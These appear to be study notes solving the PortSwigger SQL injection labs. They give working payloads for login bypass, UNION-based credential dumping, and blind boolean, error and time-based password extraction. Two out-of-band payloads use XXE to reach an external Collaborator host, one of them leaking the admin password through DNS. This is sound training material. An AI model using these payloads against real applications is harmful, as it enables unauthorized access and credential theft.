  

## [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

  

- Inject into the category parameter

```sql

'+OR+1=1--

```

  

## [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

  

- Inject this payload in the username feild to log in as admin.

- Add random value for password

```sql

administrator'--

```

  

## [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

  

- Inject a `'` and check for any errors indicating an SQLi vulnerability.

- Check if database type is Oracle by injection payload to extract the database version.

- Payload:

```sql

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

```

## [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

  

- [ ] Intercept a product category filter request in Burp and send it to Repeater

- [ ] Confirm two text columns are returned by injecting `'+UNION+SELECT+'abc','def'#` into the `category` parameter

- [ ] Inject `'+UNION+SELECT+@@version,+NULL#` to display the database version string

  

---

**Key things to remember:**

  

- `#` is the MySQL/MSSQL comment character (use `--` for Oracle/PostgreSQL)

- `@@version` is the MySQL/Microsoft syntax — Oracle uses `v$version`, PostgreSQL uses `version()`

- The `+` signs are URL-encoded spaces; you can also use `%20`

  
  

## [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

  

- [ ] Intercept a product category filter request in Burp and send it to Repeater

- [ ] Confirm two text columns are returned by injecting `'+UNION+SELECT+'abc','def'--` into the `category` parameter

- [ ] Retrieve the list of tables by injecting `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

- [ ] Identify the table containing user credentials

- [ ] Retrieve its columns by injecting `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='your_table'--`

- [ ] Identify the username and password column names

- [ ] Dump credentials by injecting `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

- [ ] Log in as `administrator` with the retrieved password

  
  

## [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)


- [ ] Intercept a product category filter request in Burp and send it to Repeater

- [ ] Confirm two text columns are returned by injecting `'+UNION+SELECT+'abc','def'+FROM+dual--` 

- [ ] Retrieve the list of tables by injecting
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

- [ ] Identify the table containing user credentials

- [ ] Retrieve its columns by injecting `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='YOUR_TABLE'--`

- [ ] Identify the username and password column names

- [ ] Dump credentials by injecting `'+UNION+SELECT+username_col,+password_col+FROM+YOUR_TABLE--`

- [ ] Log in as `administrator` with the retrieved password

  

## [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

- Inject into the category parameter

```sql

' UNION SELECT NULL,NULL,NULL--

```

  

## [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

  

- Inject into the category parameter.

- Change the value to the one provided by the lab.

  

```sql

'+UNION+SELECT+NULL,'abcdef',NULL--

```

  
  

## [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

  

- [ ] Intercept a category filter request and send to Repeater

- [ ] Inject `'+UNION+SELECT+'abc','def'--` into the `category` parameter → both values appear in the response, confirming 2 text columns

  

**Dump the users table**

  

- [ ] Inject `'+UNION+SELECT+username,+password+FROM+users--` → usernames and passwords appear in the response

  

**Log in**

  

- [ ] Use the `administrator` credentials from the response to log in

  

## [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

  

- Intercept a category filter request and send to Repeater

- [ ] Inject `'+UNION+SELECT+NULL,'abc'--` → `'abc'` appears in the response, confirming column 2 is the text column

  

**Dump users concatenated into the single text column**

  

- [ ] Inject `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` → response shows entries like `administrator~s3cur3p4ssw0rd`

  

**Log in**

  

- [ ] Use the `administrator` credentials to log in

  

## [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

  

- Open the lab, intercept a request in Burp Suite, find the `TrackingId` cookie

  

**Confirm blind SQLi via conditional responses**

  

- [ ] Append `' AND '1'='1` → confirm "Welcome back" appears

- [ ] Append `' AND '1'='2` → confirm "Welcome back" disappears

  

**Confirm the `users` table and `administrator` user exist**

  

- [ ] `' AND (SELECT 'a' FROM users LIMIT 1)='a` → "Welcome back" appears

- [ ] `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` → "Welcome back" appears

  

**Determine password length**

  

- [ ] Use `AND LENGTH(password)>N` (increment N) in Repeater until "Welcome back" disappears — password is 20 chars

  

**Extract the password character by character (Burp Intruder)**

  

- [ ] Set cookie to: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

- [ ] Set payload list to `a-z` + `0-9`

- [ ] In Settings → **Grep - Match**, add `Welcome back`

- [ ] Launch attack, find the char with a ✓ in the "Welcome back" column

- [ ] Repeat for positions 2–20, noting each character

  

**Log in**

  

- [ ] Go to **My account**, log in as `administrator` with the assembled password

  
  

## [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

  

- Intercept a request in Burp Suite and locate the `TrackingId` cookie

  

**Confirm error-based SQLi**

  

- [ ] Append `'` → confirm 500 error

- [ ] Append `''` → confirm error disappears (syntax error is detectable)

  

**Confirm Oracle DB & valid injection point**

  

- [ ] Try `'||(SELECT '' FROM dual)||'` → no error (confirms Oracle)

- [ ] Try `'||(SELECT '' FROM not-a-real-table)||'` → error (confirms injection is executed as SQL)

  

**Confirm `users` table and `administrator` exist**

  

- [ ] `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` → no error (table exists)

- [ ] `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` → 500 error (user exists)

  

**Determine password length (Repeater)**

  

- [ ] Use `CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END` incrementing N until error disappears — password is 20 chars

  

**Extract password character by character (Intruder)**

  

- [ ] Set cookie to: `'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

- [ ] Payload list: `a-z` + `0-9`

- [ ] Launch attack — find the row with **HTTP 500** → that payload is the correct character

- [ ] Repeat for positions 2–20, noting each character

  

**Log in**

  

- [ ] Go to **My account**, log in as `administrator` with the assembled password

  

## [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

  

- [ ] Append `'` to `TrackingId` → verbose error revealing the full SQL query

- [ ] Append `'--` → error gone, query is valid

  

**Build up the CAST injection**

  

- [ ] `TrackingId=xyz' AND CAST((SELECT 1) AS int)--` → error: AND must be boolean

- [ ] `TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--` → no error, valid query

  

**Extract username**

  

- [ ] `TrackingId=xyz' AND 1=CAST((SELECT username FROM users) AS int)--` → truncation error (too long)

- [ ] Clear the TrackingId value: `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` → error leaks `administrator`

  

**Extract password**

  

- [ ] `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` → error leaks the password

  

**Log in**

  

- [ ] Sign in as `administrator` with the leaked password

  

## [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

  

- [ ] Intercept a request containing the `TrackingId` cookie and send to Repeater

- [ ] Set the cookie to `TrackingId=x'||pg_sleep(10)--` and send → response takes 10 seconds → lab solved

  
  

## [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

  

- [ ] Intercept the `TrackingId` cookie request, send to Repeater

- [ ] Set cookie to `x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` → response takes 10s ✓

- [ ] Change to `(1=2)` → response is immediate ✓

  

**Confirm `administrator` exists**

  

- [ ] `x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` → 10s delay confirms the user exists

  

**Determine password length (Repeater)**

  

- [ ] Use `AND+LENGTH(password)>N` incrementing N until response is immediate — password is 20 chars

  

**Extract password character by character (Intruder)**

  

- [ ] Set cookie to: `x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

- [ ] Payload list: `a-z` + `0-9`

- [ ] In **Resource pool**, set **Maximum concurrent requests** to `1` (critical — timing only works single-threaded)

- [ ] Launch attack → find the row with ~10,000ms in the **Response received** column → that's the correct character

- [ ] Repeat for positions 2–20

  

**Log in**

  

- [ ] Sign in as `administrator` with the assembled password

  

## [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

  

- Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.

- Modify the `TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

- Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.

  
  

## [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

  

**Set up Collaborator**

  

- [ ] In Burp Pro, go to the **Collaborator** tab and copy your Collaborator subdomain

  

**Send the exfiltration payload**

  

- [ ] Intercept the `TrackingId` cookie request and set it to (replacing `BURP-COLLABORATOR-SUBDOMAIN`):

  

```

x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

```

  

- [ ] Alternatively, right-click the cookie value and use **Insert Collaborator payload** to insert the subdomain automatically

- [ ] Send the request

  

**Retrieve the password**

  

- [ ] Go to the **Collaborator** tab and click **Poll now** (wait a few seconds and retry if nothing appears)

- [ ] Find the DNS or HTTP interaction — the administrator's password appears as a subdomain prefix in the looked-up hostname

  

**Log in**

  

- [ ] Sign in as `administrator` with the leaked password

  

## [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

  

- Find a query that is retrieving data from the backend. (It will be an XML request in this lab)

- Only one column can be returned via sql query so you'll need to create a payload that concatenates the username and password column.

- Use the [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension in burp to encode the payload. (Use **dec_entities/hex_entities** for this lab)

- Payload:

```sql

1 UNION SELECT username || '~' || password FROM users--

```